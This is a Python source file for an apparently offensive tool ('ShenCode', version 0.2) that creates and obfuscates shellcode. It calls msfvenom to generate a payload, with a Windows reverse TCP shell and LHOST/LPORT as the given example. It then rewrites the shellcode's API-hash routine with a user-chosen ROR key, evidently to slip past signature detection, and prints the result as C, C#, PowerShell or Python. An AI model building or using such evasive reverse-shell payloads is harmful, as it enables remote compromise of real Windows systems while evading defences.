import argparse
import os
import subprocess

import utils.assist as assist
import utils.shellcode as sc

msfvenom_path = "c:\\metasploit-framework\\bin\\msfvenom.bat"

class nstate:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m[*]\033[0m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m[+]\033[0m'
    WARNING = '\033[93m'
    FAIL = '\033[91m[-]\033[0m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def main():
  print(f"{nstate.HEADER}____ _  _ ____ _  _ ____ ____ ___  ____ {nstate.ENDC}")
  print(f"{nstate.HEADER}[__  |__| |___ |\\ | |    |  | |  \\ |___ {nstate.ENDC}")
  print(f"{nstate.HEADER}___] |  | |___ | \\| |___ |__| |__/ |___{nstate.ENDC}")
  print(f"{nstate.HEADER}Version 0.2 by psycore8{nstate.ENDC}")
  parser = argparse.ArgumentParser(description="create and obfuscate shellcodes")
  #parser.add_argument("-mods", "--mod_shellcode", choices=["msfvenom","file"],               help="Shellcode module: msfvenom, file")
  parser.add_argument("-p", "--payload",                        help="Payload to use e.g. windows/shell_reverse_tcp")
 #parser.add_argument("-i", "--inputfile",                      help="don't create a payload from msfvenom, use an existing shellcode instead") 
  parser.add_argument("-a1","--arg1",                           help="argument1 for payload e.g. LHOST=127.0.0.1")
  parser.add_argument("-a2","--arg2",                           help="argument2 for payload e.g. LPORT=4443")
  parser.add_argument("-k", "--key",                            help="ROR key for encoding")
  parser.add_argument("-d", "--decompile", action="store_true", help="decompile modified bytes")
  parser.add_argument("-s", "--showmod",   action="store_true", help="display modifications")
  #parser.add_argument("-v", "--verbose",   action="store_true", help="displays c++/c# shellcode")
  parser.add_argument("-of", "--outputformat", choices=["c","casm","cs","ps1","py","hex"], help="formatting the shellcode in C, Casm, C#, Powershell, python or hex")
  
  args = parser.parse_args()
  ror_key = args.key
  decompile = args.decompile
  showmod = args.showmod
  #verbose = args.verbose
  payload = args.payload
  arg1 = args.arg1
  arg2 = args.arg2
  OutputFormat = args.outputformat
  
  if (int(ror_key) < 32) or (int(ror_key) > 255):
    print(f"{nstate.FAIL} Key must be between 33 and 255")
    exit()
 
  #if file_path and my_key:
    #print(f"[+] Encoding shellcode {file_path} using ROR key: {my_key}")
  #else:
    #print("[+] Please provide both --shellcode and --key arguments.")
    #exit()
  
  h = assist.helper
  file_name = str(h.GenerateFileName())
  print(f"{nstate.OKGREEN} filename will be: "+file_name)
  
  print(f"{nstate.OKBLUE} create payload")
  result = subprocess.run([msfvenom_path, "-p", payload, arg1, arg2, "-e", "generic/none", "--format", "raw", "-o", file_name])
  #if args.verbose:
    #print(result.stdout)

  path = "./"+file_name
  cf = os.path.isfile(path)
  if cf == True:
    print(f"{nstate.OKGREEN} shellcode created")
  else:
    print(f"{nstate.FAIL} shellcode output not found, EXIT")
    exit()
  
   # Populate hash_dict global variable
  dll_paths = ['C:\\Windows\\System32\\kernel32.dll', 
                 'C:\\Windows\\System32\\ws2_32.dll', 
                 'C:\\Windows\\System32\\wininet.dll', 
                 'C:\\Windows\\System32\\dnsapi.dll',
                 'C:\\Windows\\System32\\mswsock.dll']
                 
  ror2rol = sc.ror2rol
  ror2rol.process(dll_paths, file_name, showmod, decompile, ror_key)
  
  print(f"{nstate.OKBLUE} processing shellcode format...")
  b2s = assist.bin2sc
  scFormat = b2s.process("output.bin",OutputFormat)
  print(scFormat)
  print(f"{nstate.OKGREEN} DONE!")

if __name__ == "__main__":
  main()
